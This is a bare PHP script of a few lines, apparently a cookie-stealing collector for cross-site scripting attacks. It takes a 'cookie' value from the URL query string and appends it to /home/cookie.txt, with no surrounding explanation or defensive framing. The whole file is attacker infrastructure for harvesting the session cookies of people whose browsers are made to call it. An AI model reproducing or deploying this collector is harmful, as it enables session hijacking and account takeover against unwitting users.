<?php
$cookie=$_GET['cookie'];
$log=fopen("/home/cookie.txt", "a");
fwrite($log,$cookie . '\\');
fclose($log);
?>

